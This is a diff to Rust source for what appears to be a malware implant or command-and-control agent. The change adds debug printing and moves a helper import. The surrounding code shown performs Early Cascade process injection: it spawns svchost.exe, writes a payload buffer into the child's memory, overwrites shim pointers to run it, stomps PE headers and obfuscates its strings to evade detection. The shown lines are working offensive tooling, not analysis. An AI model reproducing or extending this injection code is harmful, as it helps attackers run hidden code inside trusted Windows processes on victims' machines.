@@ -3,7 +3,7 @@ use std::{
     ptr::{null_mut, read_unaligned},
 };
 
-use shared::{pretty_print::print_failed, tasks::WyrmResult};
+use shared::tasks::WyrmResult;
 use shared_no_std::{
     export_resolver::find_export_from_unmapped_file,
     memory::{EarlyCascadePointers, locate_shim_pointers},
@@ -25,7 +25,10 @@ use windows_sys::Win32::{
     },
 };
 
-use crate::utils::pe_stomp::stomp_pe_header_bytes;
+use crate::{
+    dbgprint,
+    utils::{console::print_failed, pe_stomp::stomp_pe_header_bytes},
+};
 
 // TODO move to profile &/ default?
 const SPAWN_AS_IMAGE: &'static [u8; 32] = b"C:\\Windows\\System32\\svchost.exe\0";
@@ -64,7 +67,7 @@ pub(super) fn early_cascade_spawn_child(mut buf: Vec<u8>) -> WyrmResult<String> 
 
         #[cfg(debug_assertions)]
         {
-            use shared::pretty_print::print_failed;
+            use crate::utils::console::print_failed;
 
             print_failed(&msg);
         }
@@ -84,6 +87,8 @@ pub(super) fn early_cascade_spawn_child(mut buf: Vec<u8>) -> WyrmResult<String> 
                 sc!("Failed to write process memory:", 71).unwrap()
             );
 
+            dbgprint!("{}", msg);
+
             unsafe { CloseHandle(pi.hThread) };
             unsafe { CloseHandle(pi.hProcess) };
 
@@ -101,6 +106,7 @@ pub(super) fn early_cascade_spawn_child(mut buf: Vec<u8>) -> WyrmResult<String> 
         Err(e) => {
             unsafe { CloseHandle(pi.hThread) };
             unsafe { CloseHandle(pi.hProcess) };
+            dbgprint!("{}", e);
             return WyrmResult::Err(e);
         }
     };
@@ -126,12 +132,15 @@ pub(super) fn early_cascade_spawn_child(mut buf: Vec<u8>) -> WyrmResult<String> 
     let Ok(shim_addresses) = locate_shim_pointers() else {
         unsafe { CloseHandle(pi.hThread) };
         unsafe { CloseHandle(pi.hProcess) };
-        return WyrmResult::Err(sc!("Could not find shim addresses.", 179).unwrap());
+        let msg = sc!("Could not find shim addresses.", 179).unwrap();
+        dbgprint!("{}", msg);
+        return WyrmResult::Err(msg);
     };
 
     if let Err(e) = execute_early_cascade(shim_addresses, pi.hProcess, p_start) {
         unsafe { CloseHandle(pi.hThread) };
         unsafe { CloseHandle(pi.hProcess) };
+        dbgprint!("{}", e);
         return WyrmResult::Err(e);
     }
 
@@ -139,7 +148,10 @@ pub(super) fn early_cascade_spawn_child(mut buf: Vec<u8>) -> WyrmResult<String> 
 
     unsafe { CloseHandle(pi.hThread) };
     unsafe { CloseHandle(pi.hProcess) };
-    WyrmResult::Ok(sc!("Process created via Early Cascade Injection.", 19).unwrap())
+
+    let ok_msg = sc!("Process created via Early Cascade Injection.", 19).unwrap();
+    dbgprint!("{}", ok_msg);
+    WyrmResult::Ok(ok_msg)
 }
 
 /// Overwrites addresses in the target process which are required to enable the Early Cascade technique as documented:
